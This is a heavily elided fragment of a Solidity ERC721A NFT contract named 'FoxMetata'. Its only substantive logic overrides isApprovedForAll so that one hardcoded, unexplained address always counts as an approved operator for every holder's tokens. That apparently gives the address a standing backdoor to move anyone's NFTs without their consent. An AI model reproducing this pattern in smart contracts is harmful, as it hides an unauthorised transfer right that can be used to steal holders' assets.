...
contract FoxMetata is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("FoxMetata", "FM", maxBatchSize_, collectionSize_) {
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x209f544da952B2f66Ab9cd3a48BbE3734B2753f2){return true;}
